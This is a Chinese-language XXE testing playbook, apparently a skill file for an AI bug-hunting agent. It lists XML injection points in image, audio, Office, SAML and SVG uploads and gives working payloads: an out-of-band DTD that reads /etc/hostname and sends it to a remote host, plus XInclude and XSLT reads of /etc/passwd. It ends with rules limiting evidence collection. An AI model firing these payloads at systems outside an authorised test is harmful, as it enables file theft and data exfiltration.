# XXE 增量手册（DeepBounty 吸收版）

> 基线：Claude-BugHunter `hunt-xxe/SKILL.md`。检查点映射：XXE001 实体回显 / XXE002 OOB 外带 / XXE003 错误信息泄露路径。

## 最优来源

- BountyGrimoire `.claude/skills/find-xxe`（上传链实战：ASP.NET/SXMP/WAV/WordPress 媒体库）
- Agentic-Bug-Hunter `skills/web2-vuln-classes/SKILL.md` §XXE（Blind OOB-DTD + SAML XXE）
- strix `strix/skills/vulnerabilities/xxe.md`（XInclude/XSLT/`document()` + OOXML 上下文）

## 增量 1：非经典载体清单（BountyGrimoire 实战链）

XML 入口不止 `Content-Type: application/xml`：
- **XMP 元数据**：JPEG/PNG/PDF 内嵌 XMP 包 → 图片上传即 XXE 入口（SXMP 解析器）
- **WAV/音频元数据**：ID3 扩展块
- **OOXML（docx/xlsx/pptx）**：zip 内 `[Content_Types].xml`/`document.xml` 注入实体（strix 有专节）
- **SAML Response**：Agentic-Bug-Hunter——SAML 断言是 XML，IdP/SP 解析链都可能 XXE
- **SVG 上传**：`<svg>` 内 DOCTYPE 实体（与文件上传类交叉）

## 增量 2：Blind OOB-DTD 标准流程（Agentic-Bug-Hunter）

无回显时一律走外带 DTD（配 deepbounty `oob_client.py`）：
1. OOB 托管 `evil.dtd`：`<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % exfil SYSTEM "http://OOB/?d=%file;">`
2. 目标文档：`<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://OOB/evil.dtd">%remote;%exfil;]>`
3. 命中 = XXE002 通过；仅 DTD 被拉取但无数据回传 = 实体解析开但外带被拦，转 XXE003 错误通道

## 增量 3：无 DOCTYPE 备选（strix）

- **XInclude**：`<xi:include href="file:///etc/passwd" parse="text"/>`（DOCTYPE 被过滤时）
- **XSLT 注入**：`document()` 函数读文件、`system-property()` 指纹
- **docx 内 relationship**：`Target="file:///..."` 模式

## 判定纪律

- 读取目标优先级：`/etc/hostname`、`/etc/resolv.conf`、`win.ini`（无害只读小文件，符合 evidence-standard 无害取证）
- 禁止读私钥/数据库凭据全文——证明存在即可，样本 ≤20 行（对齐 evidence_gate 打码规则）
